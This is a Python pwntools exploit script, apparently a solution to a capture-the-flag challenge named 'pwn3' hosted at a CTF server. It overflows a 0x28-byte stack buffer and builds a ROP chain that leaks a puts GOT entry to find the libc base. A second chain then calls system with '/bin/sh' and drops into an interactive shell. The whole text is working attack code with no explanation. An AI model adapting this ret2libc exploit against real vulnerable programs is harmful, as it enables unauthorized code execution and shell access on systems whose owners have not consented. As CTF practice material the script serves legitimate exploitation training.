from pwn import *

binary = context.binary = ELF("./pwn3")
libc = ELF("./libc.so")
ld = ELF("./ld.so")

if args.REMOTE:
    p = remote('challs.n00bzunit3d.xyz', 42450)
elif args.GDB:
    p = gdb.debug([ld.path, binary.path], env={"LD_PRELOAD":libc.path})
else:
    p = process([ld.path, binary.path], env={"LD_PRELOAD":libc.path})

puts_got   = 0x404018
rdi_gadget = 0x401232
ret_gadget = 0x401233
puts_addr  = 0x4011fb
puts_plt   = 0x401060
main_addr  = 0x4011db
system_off = 0x487f0
binsh_off  = 0x1a9f8f
one_shot   = 0xf1b4e

payload = b""
payload += b"A" * 0x28
# payload += b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE"

payload += p64(rdi_gadget)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

p.sendline(payload)

p.readline()
p.readline()
tmp = p.readline()[:-1]
libc_base = u64(tmp + b"\x00" * (8 - len(tmp))) - 0x73770
print(f"libc base: {hex(libc_base)}")

system_addr   = libc_base + system_off
one_shot_addr = libc_base + one_shot
binsh_addr    = libc_base + binsh_off

payload = b""
payload += b"A" * 0x28
# payload += p64(one_shot_addr)
payload += p64(rdi_gadget)
payload += p64(binsh_addr)
payload += p64(ret_gadget)
payload += p64(system_addr)

p.send(payload)

p.interactive()